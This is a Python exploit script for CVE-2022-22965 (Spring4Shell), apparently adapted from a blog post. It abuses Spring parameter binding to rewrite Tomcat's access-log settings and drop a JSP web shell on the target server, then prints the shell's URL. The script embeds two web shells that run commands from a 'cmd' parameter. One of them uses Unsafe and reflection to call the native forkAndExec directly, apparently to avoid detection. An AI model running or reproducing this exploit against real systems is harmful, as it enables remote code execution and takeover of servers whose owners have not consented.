# adapted from https://aquasosal.tistory.com/24

from urllib.parse import urlparse
import requests
import argparse
import urllib3
import time

urllib3.disable_warnings()

WEBShell_BASIC= """%{directive}i page import="java.util.*,java.io.*" %{endtag}i %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i"""

WEBShell_Native_forkAndExec="""%{directive}i page import="sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.nio.*,java.io.*" %{endtag}i %{starttag}i
try {
    Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
    theUnsafeField.setAccessible(true);
    Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
    Class<?> processClass = Class.forName("java.lang.ProcessImpl");
    Object processObject = unsafe.allocateInstance(processClass);
    String command = request.getParameter("%{parameter}i");
    if (command != null) {
        String[] cmdarray = command.split(" ");
        byte[][] args = new byte[cmdarray.length - 1][];
        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = cmdarray[i + 1].getBytes();
            size += args[i].length;
        }
        byte[] argBlock = new byte[size];
        int i = 0;
        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        int[] envc = new int[1];
        byte[] envBlock = null;
        int[] std_fds = new int[]{-1, -1, -1};
        boolean forceNullOutputStream = false;
        byte[] bytes = cmdarray[0].getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject = (byte[]) helperpathField.get (processObject);
        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{ int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class });
        forkMethod.setAccessible(true);
        int pid = (int) forkMethod.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, result, argBlock, args.length, null, envc[0], null, std_fds, false });
        out.println("hehe native method forkMethod executed, nothing to see here :o");
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds, false);
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
    }
        
    }
} catch (Exception e) {
    out.println("Error: " + e.getMessage()); // Handle exceptions
}
%{endtag}i
"""

classes = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat',
]

Template_Variable = {
    'directive':'<%@',
    'endtag':'%>',
    'starttag':'<%',
    'parameter':'cmd'
}

def argv():
        parser = argparse.ArgumentParser(description='CVE-2022-22965 RCE Exploit')

        parser.add_argument('--url', help='target url EX) --url=http://localhost:8080', default="http://localhost:8080/exploit/greeting", dest="target", required=True)
        parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd", dest="filename")
        parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',  default="webapps/ROOT")

        args = parser.parse_args()

        return args.filename, args.dir, args.target

def exploit():

    filename, directory, target = argv()

    payloads = {
        classes[0]:WEBShell_Native_forkAndExec,
        classes[1]:'.jsp',
        classes[2]:directory,
        classes[-2]:filename,
        classes[-1]:'',
    }

    res = requests.post(target, data={classes[-1]:'_'})
    print(f"\033[92m[+] INFO - {classes[0]} Resetting : _")

    res = requests.post(target, data=payloads)
    print(f"\033[92m[+] INFO - POST Response status code : {res.status_code}\033[0m")

    time.sleep(3)

    res = requests.get(target, headers=Template_Variable)

    print(f"\033[92m[+] INFO - GET Response status code : {res.status_code}\033[0m")

    time.sleep(1)

    res = requests.post(target, data={classes[0]:''})

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")

if __name__ == '__main__':
    exploit()